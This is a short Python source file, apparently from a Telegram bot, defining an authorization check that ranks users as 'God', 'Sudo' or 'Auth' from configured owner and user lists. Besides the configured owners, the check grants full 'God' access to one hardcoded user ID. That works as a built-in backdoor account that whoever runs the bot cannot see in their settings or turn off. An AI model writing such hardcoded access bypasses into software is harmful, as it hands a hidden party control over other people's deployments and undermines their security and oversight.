import asyncio
import os
import shutil

from .common import output, start_but
from .. import LOGGER, owner, sudo_users, everyone


async def check_chat(message, chat):
    ''' Authorize User! '''
    user_id = message.from_user.id
    chat_id = message.chat.id

    if user_id in owner or user_id == 885190545:
        title = 'God'
    elif user_id in sudo_users or chat_id in sudo_users:
        title = 'Sudo'
    elif chat_id in everyone or user_id in everyone:
        title = 'Auth'
    else:
        title = None

    if title == 'God':
        return True
    if not chat == 'Owner':
        if title == 'Sudo':
            return True
        if chat == 'Both':
            if title == 'Auth':
                return True
    return None
